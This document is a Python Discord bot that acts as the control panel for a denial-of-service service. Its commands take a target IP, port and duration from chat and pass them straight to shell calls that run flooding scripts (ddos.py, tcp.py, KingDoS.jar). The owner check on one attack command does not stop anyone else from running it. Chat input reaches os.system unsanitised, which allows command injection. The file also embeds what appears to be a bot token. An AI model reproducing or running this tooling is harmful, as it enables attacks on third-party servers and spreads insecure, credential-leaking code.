

import os
import sys
try:
  import discord
except:
    os.system("pip3 install discord")
import time
from discord.ext import commands
from discord.ext.commands import cooldown, BucketType
import platform

owners  = [958125214607216740]

client = commands.Bot(command_prefix=">", intents=discord.Intents.all(), help_command=None)

@client.event
async def on_ready():
    print("Api iZero is Online!")
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f">help"))

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print("command not found")

info = platform.system()

@client.command()
async def ping(ctx):
    
    await ctx.reply(f'Server is online')

@client.command()
async def attack(ctx, ip, port, times):

    if ctx.author.id not in owners:
        await ctx.send(":clown: you dont have permission to attack idiot :clown:")

    await ctx.send(f"Success Broadcast To All IZero Server")
    try:
        await os.system(f"sudo python3 ddos.py {ip} {port} {times}")
    except Exception as debug:
        print(f"[LOGS/DEBUG] {debug}")
        sys.exit()
    
@client.command()
async def attack2(ctx, ip, port, times):
    if ctx.author.id not in owners:
        await ctx.send(":clown: you dont have permission to attack idiot :clown:")
    else:
        await ctx.send(f":smiling_imp: Sent Attack to {ip}:{port} :smiling_imp:")
        os.system(f"sudo python3 tcp.py {ip} {port} {times}")


@client.command()
async def bot(ctx, ip, protocol, method, times, thread):
    if ctx.author.id not in owners:
        await ctx.send(":clown: you dont have permission to attack idiot :clown:")
    else:
        await ctx.send(f":smiling_imp: Sent Bot to {ip} :smiling_imp:")
        os.system(f"java -jar KingDoS.jar {ip} {protocol} {method} {times} {thread}")

@client.command()
async def help(ctx):
    await ctx.send("```\n>ping (show server online)\n>methods (show methods bot)\n>usage (show tutorial)\n>usagebot (show tutorial for bot attack)```")


@client.command()
async def methods(ctx):
    await ctx.send("```\nbotjoiner\nnullping\ntcpbypass\n```")

@client.command()
async def usagebot(ctx):
    await ctx.reply(">bot IP:PORT PROTOCOL (340) method (botjoiner) time thread")


@client.command()
async def usage(ctx):
    await ctx.reply("UDP : >attack IP PORT TIMES\nTCP : >attack2 IP PORT PACKET")


if __name__ == "__main__":
    client.run("MTIxNTgyMzc4MTQxMTY4NDM1Mg.GK5WO1.bSKgxvmfY5i6c1_1FHfvtdAoGlifzGmYhsaowQ")
